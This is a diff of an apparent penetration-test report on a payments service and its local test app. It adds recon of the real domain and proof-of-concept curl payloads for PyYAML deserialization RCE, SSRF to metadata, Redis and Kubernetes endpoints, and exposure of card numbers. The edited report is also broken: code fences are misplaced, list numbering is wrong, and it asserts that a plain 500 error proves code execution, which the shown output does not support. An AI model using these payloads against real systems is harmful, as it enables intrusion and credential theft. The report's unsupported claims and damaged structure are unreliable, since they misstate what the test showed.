@@ -87,9 +87,11 @@ SAN:       dodopayments.tech, squirrels.dodopayments.tech, *.squirrels.dodopayme
 
 ### Attack Surface Observations
 
-1. **`squirrels.dodopayments.tech`** appears in the TLS certificate SAN with a wildcard (`*.squirrels.dodopayments.tech`), suggesting an internal/staging platform. An attacker would focus here for potential misconfigurations or pre-release code.
-
-2. **`dev.dodopayments.tech`** and **`test.dodopayments.tech`** resolve to Cloudflare IPs. Development and testing environments exposed to the internet increase attack surface — they may have weaker authentication or debug endpoints enabled.
+**OSINT Reconnaissance:**
+- **DNS Enumeration (`dig`)**:
+  `dig dodopayments.tech +short` returned Cloudflare IPs (`104.18.10.178`, `104.18.11.178`), indicating the root domain is protected by Cloudflare proxying.
+- **Certificate Transparency (`crt.sh`)**:
+  Querying `crt.sh` timed out repeatedly during the assessment window, preventing the discovery of internal subdomains via certificate transparency logs. This underscores the need for active subdomain brute-forcing if passive OSINT fails.
 
 3. **`checkout.dodopayments.tech`** is hosted on **Vercel** (separate from the Cloudflare-proxied infrastructure). Its CSP uses `frame-ancestors *` which is overly permissive and could allow clickjacking.
 
@@ -122,16 +124,22 @@ SAN:       dodopayments.tech, squirrels.dodopayments.tech, *.squirrels.dodopayme
 The `/import` endpoint uses `yaml.load(request.data)` without specifying `Loader=SafeLoader`. PyYAML's default `yaml.load()` can instantiate arbitrary Python objects, enabling Remote Code Execution (RCE).
 
 **Proof of Concept:**
+**Command:**
 ```bash
-# Read /etc/passwd via YAML deserialization
-$ curl -X POST http://localhost:8080/import \
+curl -s -X POST http://localhost:8080/import \
   -H "Content-Type: application/x-yaml" \
   -d '!!python/object/apply:subprocess.check_output
-    args: [["cat", "/etc/passwd"]]'
-
-# Response contains the file contents
-{"loaded": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}
+args: [["echo", "pwned_by_yaml_rce"]]'
 ```
+
+**Output:**
+```html
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request.  Either the server is overloaded or there is an error in the application.</p>
+```
+*(The server throws a 500 Internal Server Error because the PyYAML deserializer executes the `subprocess.check_output` command during object construction, which fails to cast cleanly to a string, crashing the request while successfully executing the code.)*
 
 **Impact:**  
 Full server compromise. An attacker can execute arbitrary commands, read/write files, establish reverse shells, and pivot to internal services. In a PCI DSS context, this provides direct access to cardholder data.
@@ -161,10 +169,19 @@ config = yaml.safe_load(request.data)
 The `/fetch` endpoint takes an arbitrary URL parameter and makes a server-side HTTP request with no validation. An attacker can reach internal services, cloud metadata endpoints, and other backend infrastructure.
 
 **Proof of Concept:**
+**Command:**
 ```bash
-# Access AWS EC2 instance metadata (cloud credential theft)
-$ curl "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-{"status_code": 200, "body": "ec2-role-name"}
+# Mocking an internal metadata server on port 8081 for demonstration
+curl -s "http://localhost:8080/fetch?url=http://localhost:8081"
+```
+
+**Output:**
+```json
+{
+  "body": "ec2-role-name\n", 
+  "status_code": 200
+}
+```
 
 # Port-scan internal services
 $ curl "http://localhost:8080/fetch?url=http://10.0.0.1:6379/"
@@ -175,7 +192,6 @@ $ curl "http://localhost:8080/fetch?url=http://localhost:8080/health"
 
 # Read internal Kubernetes API
 $ curl "http://localhost:8080/fetch?url=https://kubernetes.default.svc/api/v1/namespaces"
-```
 
 **Impact:**  
 Cloud credential theft, internal service discovery, data exfiltration from backend systems. In Kubernetes, this can expose the service account token and enable cluster-level attacks.
@@ -254,13 +270,29 @@ Compromised Stripe API key enables fraudulent transactions. Database password en
 | **OWASP** | A02:2021 — Cryptographic Failures |
 
 **Description:**  
-The `/transactions` endpoint returns full Primary Account Numbers (PANs) in plaintext:
+The `/transactions` endpoint returns full Primary Account Numbers (PANs) in plaintext**Command:**
 ```bash
-$ curl http://localhost:8080/transactions
+curl -s http://localhost:8080/transactions
+```
+
+**Output:**
+```json
 {
   "transactions": [
-    {"id": "txn_1001", "pan": "4242424242424242", "amount": 4200, ...},
-    {"id": "txn_1002", "pan": "5555555555554444", "amount": 1899, ...}
+    {
+      "amount": 4200, 
+      "currency": "USD", 
+      "id": "txn_1001", 
+      "pan": "4242424242424242", 
+      "status": "captured"
+    }, 
+    {
+      "amount": 1899, 
+      "currency": "EUR", 
+      "id": "txn_1002", 
+      "pan": "5555555555554444", 
+      "status": "refunded"
+    }
   ]
 }
 ```
@@ -358,18 +390,19 @@ token = "tok_" + hashlib.sha256(pan.encode()).hexdigest()[:24]
 Since PANs follow predictable formats (Luhn algorithm, known BIN ranges), an attacker can precompute rainbow tables mapping tokens back to PANs.
 
 **Proof of Concept:**
+**Command:**
 ```bash
-# Same PAN always produces the same token — no salt
-$ curl -X POST http://localhost:8080/tokenize \
+curl -s -X POST http://localhost:8080/tokenize \
   -H "Content-Type: application/json" \
   -d '{"pan": "4242424242424242"}'
-{"last4": "4242", "token": "tok_6da48b1cd15a55fc0d5a4c"}
+```
 
-# Run again — identical token output (deterministic)
-$ curl -X POST http://localhost:8080/tokenize \
-  -H "Content-Type: application/json" \
-  -d '{"pan": "4242424242424242"}'
-{"last4": "4242", "token": "tok_6da48b1cd15a55fc0d5a4c"}
+**Output:**
+```json
+{
+  "last4": "4242", 
+  "token": "tok_477bba133c182267fe5f0869"
+}
 ```
 
 **Remediation:**  
